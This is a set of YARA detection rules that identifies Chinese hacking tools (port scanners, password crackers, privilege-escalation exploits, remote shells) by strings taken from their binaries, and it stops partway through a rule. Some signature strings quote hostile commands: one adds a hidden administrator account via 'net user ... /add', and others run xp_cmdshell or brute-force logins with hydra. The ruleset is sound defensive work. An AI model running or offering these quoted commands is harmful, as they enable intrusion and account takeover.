rule IISPutScanner_RID2BF9 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file IISPutScanner_RID2BF9.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:29:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "KERNEL32.DLL" fullword ascii
      $s3 = "ADVAPI32.DLL" fullword ascii
      $s4 = "VERSION.DLL" fullword ascii
      $s5 = "WSOCK32.DLL" fullword ascii
      $s6 = "COMCTL32.DLL" fullword ascii
      $s7 = "GDI32.DLL" fullword ascii
      $s8 = "SHELL32.DLL" fullword ascii
      $s9 = "USER32.DLL" fullword ascii
      $s10 = "OLEAUT32.DLL" fullword ascii
      $s11 = "LoadLibraryA" fullword ascii
      $s12 = "GetProcAddress" fullword ascii
      $s13 = "VirtualProtect" fullword ascii
      $s14 = "VirtualAlloc" fullword ascii
      $s15 = "VirtualFree" fullword ascii
      $s16 = "ExitProcess" fullword ascii
      $s17 = "RegCloseKey" fullword ascii
      $s18 = "GetFileVersionInfoA" fullword ascii
      $s19 = "ImageList_Add" fullword ascii
      $s20 = "BitBlt" fullword ascii
      $s21 = "ShellExecuteA" fullword ascii
      $s22 = "ActivateKeyboardLayout" fullword ascii
      $s23 = "BBABORT" fullword wide
      $s25 = "BBCANCEL" fullword wide
      $s26 = "BBCLOSE" fullword wide
      $s27 = "BBHELP" fullword wide
      $s28 = "BBIGNORE" fullword wide
      $s29 = "PREVIEWGLYPH" fullword wide
      $s30 = "DLGTEMPLATE" fullword wide
      $s31 = "TABOUTBOX" fullword wide
      $s32 = "TFORM1" fullword wide
      $s33 = "MAINICON" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them
} 

rule IDTools_For_WinXP_IdtTool_2_RID3119 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file IdtTool.sys"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:08:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Device\\devIdtTool" fullword wide
      $s1 = "IoDeleteSymbolicLink" fullword ascii
      $s3 = "IoDeleteDevice" fullword ascii
      $s6 = "IoCreateSymbolicLink" fullword ascii
      $s7 = "IoCreateDevice" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 7KB and all of them
} 

rule hkmjjiis6_RID2AA0 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file hkmjjiis6_RID2AA0.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 07:18:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "comspec" fullword ascii
      $s2 = "user32.dlly" ascii
      $s3 = "runtime error" ascii
      $s4 = "WinSta0\\Defau" ascii
      $s5 = "AppIDFlags" fullword ascii
      $s6 = "GetLag" fullword ascii
      $s7 = "* FROM IIsWebInfo" ascii
      $s8 = "wmiprvse.exe" ascii
      $s9 = "LookupAcc" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them
} 

rule Dos_lcx_RID29DD : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file lcx.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 01:53:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "c:\\Users\\careful_snow\\" ascii
      $s1 = "Desktop\\Htran\\Release\\Htran.pdb" ascii
      $s3 = "[SERVER]connection to %s:%d error" fullword ascii
      $s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $s6 = "=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] " ascii
      $s7 = "[-] There is a error...Create a new connection." fullword ascii
      $s8 = "[+] Accept a Client on port %d from %s" fullword ascii
      $s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $s13 = "[+] Make a Connection to %s:%d...." fullword ascii
      $s16 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
      $s17 = "[+] Waiting another Client on port:%d...." fullword ascii
      $s18 = "[+] Accept a Client on port %d from %s ......" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them
} 

rule x_way2_5_X_way_RID2C66 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file X-way.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:47:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "TTFTPSERVERFRM" fullword wide
      $s1 = "TPORTSCANSETFRM" fullword wide
      $s2 = "TIISSHELLFRM" fullword wide
      $s3 = "TADVSCANSETFRM" fullword wide
      $s4 = "ntwdblib.dll" fullword ascii
      $s5 = "TSNIFFERFRM" fullword wide
      $s6 = "TCRACKSETFRM" fullword wide
      $s7 = "TCRACKFRM" fullword wide
      $s8 = "dbnextrow" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 5 of them
} 

rule tools_Sqlcmd_RID2C05 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Sqlcmd.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:31:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[Usage]:  %s <HostName|IP> <UserName> <Password>" fullword ascii
      $s1 = "=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============" fullword ascii
      $s4 = "Cool! Connected to SQL server on %s successfully!" fullword ascii
      $s5 = "EXEC master..xp_cmdshell \"%s\"" fullword ascii
      $s6 = "=======================Sqlcmd v0.21 For HScan v1.20=======================" fullword ascii
      $s10 = "Error,exit!" fullword ascii
      $s11 = "Sqlcmd>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 3 of them
} 

rule Sword1_5_RID29E5 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Sword1.5.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 02:06:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "http://www.ip138.com/ip2city.asp" fullword wide
      $s4 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
      $s6 = "ListBox_Command" fullword wide
      $s13 = "md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack" fullword wide
      $s18 = "\\Set.ini" fullword wide
      $s19 = "OpenFileDialog1" fullword wide
      $s20 = " (*.txt)|*.txt" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 4 of them
} 

rule Dos_c_RID28F9 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file c.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 19:33:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "!Win32 .EXE." fullword ascii
      $s1 = ".MPRESS1" fullword ascii
      $s2 = ".MPRESS2" fullword ascii
      $s3 = "XOLEHLP.dll" fullword ascii
      $s4 = "</body></html>" fullword ascii
      $s8 = "DtcGetTransactionManagerExA" fullword ascii
      $s9 = "GetUserNameA" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule arpsniffer_RID2B41 : DEMO EXE FILE HKTL T1040 T1086 T1136 {
   meta:
      description = "Chinese Hacktool Set - file arpsniffer_RID2B41.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:58:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1040, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SHELL" ascii
      $s2 = "PacketSendPacket" fullword ascii
      $s3 = "ArpSniff" ascii
      $s4 = "pcap_loop" fullword ascii
      $s5 = "packet.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and all of them
} 

rule pw_inspector_2_RID2CBF : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file pw-inspector.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:02:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
      $s2 = "Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p " ascii
      $s3 = "PW-Inspector" fullword ascii
      $s4 = "i:o:m:M:c:lunps" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them
} 

rule datPcShare_RID2AF0 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file datPcShare_RID2AF0.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "PcShare.EXE" fullword wide
      $s2 = "MZKERNEL32.DLL" fullword ascii
      $s3 = "PcShare" fullword wide
      $s4 = "QQ:4564405" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them
} 

rule Tools_xport_RID2BBE : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file xport.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)" fullword ascii
      $s2 = "Example: xport www.xxx.com 80 -m syn" fullword ascii
      $s3 = "%s - command line port scanner" fullword ascii
      $s4 = "xport 192.168.1.1 1-1024 -t 200 -v" fullword ascii
      $s5 = "Usage: xport <Host> <Ports Scope> [Options]" fullword ascii
      $s6 = ".\\port.ini" fullword ascii
      $s7 = "Port scan complete, total %d port, %d port is opened, use %d ms." fullword ascii
      $s8 = "Code by glacier <glacier@xfocus.org>" fullword ascii
      $s9 = "http://www.xfocus.org" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them
} 

rule Pc_xai_RID2965 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file xai.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 22:33:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/" fullword wide
      $s2 = "%SystemRoot%\\System32\\" fullword ascii
      $s3 = "%APPDATA%\\" fullword ascii
      $s4 = "---- C.Rufus Security Team ----" fullword wide
      $s5 = "www.snzzkz.com" fullword wide
      $s6 = "%CommonProgramFiles%\\" fullword ascii
      $s7 = "GetRand.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule Radmin_Hash_RID2B4F : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Radmin_Hash_RID2B4F.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:01:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<description>IEBars</description>" fullword ascii
      $s2 = "PECompact2" fullword ascii
      $s3 = "Radmin, Remote Administrator" fullword wide
      $s4 = "Radmin 3.0 Hash " fullword wide
      $s5 = "HASH1.0" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them
} 

rule OSEditor_RID2A1A : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file OSEditor_RID2A1A.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 03:35:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "OSEditor_RID2A1A.exe" fullword wide
      $s2 = "netsafe" wide
      $s3 = "OSC Editor" fullword wide
      $s4 = "GIF89" ascii
      $s5 = "Unlock" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule GoodToolset_ms11011_RID2DB7 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file ms11011.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:43:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\i386\\Hello.pdb" ascii
      $s1 = "OS not supported." fullword ascii
      $s3 = "Not supported." fullword wide
      $s4 = "SystemDefaultEUDCFont" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule FreeVersion_release_RID2EB9 : DEMO EXE FILE HKTL T1087 T1136 {
   meta:
      description = "Chinese Hacktool Set - file release.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:26:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-->Got WMI process Pid: %d " ascii
      $s2 = "This exploit will execute \"net user " ascii
      $s3 = "net user temp 123456 /add & net localgroup administrators temp /add" fullword ascii
      $s4 = "Running reverse shell" ascii
      $s5 = "wmiprvse.exe" fullword ascii
      $s6 = "SELECT * FROM IIsWebInfo" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them
} 

rule churrasco_RID2ADB : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file churrasco_RID2ADB.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Done, command should have ran as SYSTEM!" ascii
      $s2 = "Running command with SYSTEM Token..." ascii
      $s3 = "Thread impersonating, got NETWORK SERVICE Token: 0x%x" ascii
      $s4 = "Found SYSTEM token 0x%x" ascii
      $s5 = "Thread not impersonating, looking for another thread..." ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them
} 

rule x64_KiwiCmd_RID2AFA : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file KiwiCmd.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:46:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
      $s2 = "Kiwi Cmd no-gpo" fullword wide
      $s3 = "KiwiAndCMD" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them
} 

rule sql1433_SQL_RID2A7B : DEMO EXE FILE HKTL {
   meta:
      description = "Chinese Hacktool Set - file SQL.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:16:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 } 
      $s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 90KB and all of them
} 

rule CookieTools2_RID2BAE : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file CookieTools2_RID2BAE.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:16:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "www.gxgl.com&www.gxgl.net" fullword wide
      $s2 = "ip.asp?IP=" fullword ascii
      $s3 = "MSIE 5.5;" fullword ascii
      $s4 = "SOFTWARE\\Borland\\" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them
} 

rule cyclotron_RID2AEE : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file cyclotron_RID2AEE.sys"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:28:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Device\\IDTProt" fullword wide
      $s2 = "IoDeleteSymbolicLink" fullword ascii
      $s3 = "\\??\\slIDTProt" fullword wide
      $s4 = "IoDeleteDevice" fullword ascii
      $s5 = "IoCreateSymbolicLink" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3KB and all of them
} 

rule xscan_gui_RID2AD2 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file xscan_gui_RID2AD2.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:41:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s -mutex %s -host %s -index %d -config \"%s\"" fullword ascii
      $s2 = "www.target.com" fullword ascii
      $s3 = "%s\\scripts\\desc\\%s.desc" fullword ascii
      $s4 = "%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule CN_Tools_hscan_RID2C7E : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file hscan.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:51:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000" fullword ascii
      $s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20" fullword ascii
      $s3 = "%s -h www.target.com -all" fullword ascii
      $s4 = ".\\report\\%s-%s.html" fullword ascii
      $s5 = ".\\log\\Hscan.log" fullword ascii
      $s6 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
      $s7 = "%s@ftpscan#FTP Account:  %s/[null]" fullword ascii
      $s8 = ".\\conf\\mysql_pass.dic" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule GoodToolset_pr_RID2CC5 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file pr.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-->Got WMI process Pid: %d " ascii
      $s2 = "-->This exploit gives you a Local System shell " ascii
      $s3 = "wmiprvse.exe" fullword ascii
      $s4 = "Try the first %d time" fullword ascii
      $s5 = "-->Build&&Change By p " ascii
      $s6 = "root\\MicrosoftIISv2" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule hydra_7_4_1_hydra_RID2D59 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file hydra.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:28:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%d of %d target%s%scompleted, %lu valid password%s found" fullword ascii
      $s2 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
      $s3 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
      $s4 = "[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED" fullword ascii
      $s5 = "[ERROR] SMTP LOGIN AUTH, either this auth is disabled" fullword ascii
      $s6 = "\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them
} 

rule CN_Tools_srss_2_RID2CCD : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file srss.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:04:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "used pepack!" fullword ascii
      $s1 = "KERNEL32.dll" fullword ascii
      $s2 = "KERNEL32.DLL" fullword ascii
      $s3 = "LoadLibraryA" fullword ascii
      $s4 = "GetProcAddress" fullword ascii
      $s5 = "VirtualProtect" fullword ascii
      $s6 = "VirtualAlloc" fullword ascii
      $s7 = "VirtualFree" fullword ascii
      $s8 = "ExitProcess" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ( $s* )
} 

rule Dos_NtGod_RID2A72 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file NtGod.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:01:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\temp\\NtGodMode.exe" ascii
      $s4 = "NtGodMode.exe" fullword ascii
      $s10 = "ntgod.bat" fullword ascii
      $s19 = "sfxcmd" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them
} 

rule CN_Tools_VNCLink_RID2CE6 : CHINA DEMO EXE FILE HKTL T1021 T1072 T1136 T1219 {
   meta:
      description = "Chinese Hacktool Set - file VNCLink.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:08:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1021, T1072, T1136, T1219"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\temp\\vncviewer4.log" fullword ascii
      $s2 = "[BL4CK] Patched by redsand || http://blacksecurity.org" fullword ascii
      $s3 = "fake release extendedVkey 0x%x, keysym 0x%x" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 580KB and 2 of them
} 

rule tools_NTCmd_RID2B57 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file NTCmd.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:02:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "pipecmd \\\\%s -U:%s -P:\"\" %s" fullword ascii
      $s2 = "[Usage]:  %s <HostName|IP> <Username> <Password>" fullword ascii
      $s3 = "pipecmd \\\\%s -U:%s -P:%s %s" fullword ascii
      $s4 = "============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============" fullword ascii
      $s5 = "=======================NTcmd v0.11 for HScan v1.20=======================" fullword ascii
      $s6 = "NTcmd>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 2 of them
} 

rule mysql_pwd_crack_RID2D54 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file mysql_pwd_crack_RID2D54.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:27:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mysql_pwd_crack_RID2D54 127.0.0.1 -x 3306 -p root -d userdict.txt" fullword ascii
      $s2 = "Successfully --> username %s password %s " fullword ascii
      $s3 = "zhouzhen@gmail.com http://zhouzhen.eviloctal.org" fullword ascii
      $s4 = "-a automode  automatic crack the mysql password " fullword ascii
      $s5 = "mysql_pwd_crack_RID2D54 127.0.0.1 -x 3306 -a" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them
} 

rule CmdShell64_RID2A87 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file CmdShell64_RID2A87.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Windows\\System32\\JAVASYS.EXE" fullword wide
      $s2 = "ServiceCmdShell" fullword ascii
      $s3 = "<!-- If your application is designed to work with Windows 8.1, uncomment the fol" ascii
      $s4 = "ServiceSystemShell" fullword wide
      $s5 = "[Root@CmdShell ~]#" fullword wide
      $s6 = "Hello Man 2015 !" fullword wide
      $s7 = "CmdShell" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 4 of them
} 

rule Ms_Viru_v_RID2AAB : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file v.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 07:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
